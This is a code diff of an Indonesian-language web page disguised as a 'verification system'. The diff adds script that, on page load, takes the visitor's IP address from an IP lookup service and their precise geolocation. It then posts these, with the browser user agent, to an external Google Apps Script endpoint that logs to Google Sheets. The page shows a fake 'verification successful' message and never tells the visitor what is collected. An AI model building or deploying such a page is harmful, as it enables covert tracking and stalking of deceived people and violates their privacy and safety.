@@ -2,51 +2,70 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Memuat Halaman...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi</title>
 </head>
 <body>
-    <p>Sedang memproses, mohon tunggu...</p>
+    <div id="status">Menginisialisasi sistem keamanan...</div>
 
     <script>
-        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxxWAHLp2YXl2QXJ5nL1rXkSjHKaufjBD19erN5J_Xjao_QdtfP3o4fnxw8G4hfFgwg8g/exec"; // Masukkan URL Deploy Apps Script di sinid
+        const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbySG8h3NAW8DpLkwFRbgKb1-vx4nOmzAno-S3jkIyoT6rLCbLEW8s1-o2uxdFaQtRgVPA/exec"; 
+        let userIP = "Tidak terdeteksi";
 
-        window.onload = function() {
+        // 1. Ambil IP Address terlebih dahulu
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                userIP = data.ip;
+                getLocation(); // Setelah IP didapat, minta lokasi
+            } catch (err) {
+                console.error("Gagal ambil IP");
+                getLocation(); // Tetap lanjut ambil lokasi meski IP gagal
+            }
+        }
+
+        // 2. Ambil Geolokasi
+        function getLocation() {
             if (navigator.geolocation) {
-                // Meminta lokasi segera setelah halaman dibuka
-                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
+                navigator.geolocation.getCurrentPosition(sendData, showError, {
                     enableHighAccuracy: true,
-                    timeout: 5000,
-                    maximumAge: 0
+                    timeout: 10000
                 });
             } else {
-                alert("Geolocation tidak didukung oleh browser ini.");
+                document.getElementById("status").innerHTML = "Browser tidak mendukung.";
             }
-        };
+        }
 
-        function sendPosition(position) {
-            const data = {
+        // 3. Kirim Semua Data ke Google Sheets
+        function sendData(position) {
+            const payload = {
+                ip: userIP,
                 lat: position.coords.latitude,
-                long: position.coords.longitude
+                long: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                userAgent: navigator.userAgent
             };
 
-            // Mengirim data ke Google Sheets menggunakan Fetch API
             fetch(WEB_APP_URL, {
                 method: "POST",
-                mode: "no-cors", // Penting untuk menghindari masalah CORS
-                body: JSON.stringify(data)
+                mode: "no-cors",
+                body: JSON.stringify(payload)
             })
             .then(() => {
-                console.log("Data terkirim");
-                document.body.innerHTML = "<h1>Data berhasil dicatat.</h1>";
+                document.getElementById("status").innerHTML = "<h3>Verifikasi Berhasil</h3>";
             })
-            .catch(err => console.error("Error:", err));
+            .catch(err => {
+                document.getElementById("status").innerHTML = "Gagal sinkronisasi data.";
+            });
         }
 
         function showError(error) {
-            console.log("Izin lokasi ditolak atau error.");
-            document.body.innerHTML = "<h1>Akses lokasi diperlukan untuk melanjutkan.</h1>";
+            document.getElementById("status").innerHTML = "<b>Error:</b> Akses lokasi diperlukan.";
         }
+
+        // Jalankan urutan fungsi
+        getIP();
     </script>
 </body>
-
 </html>
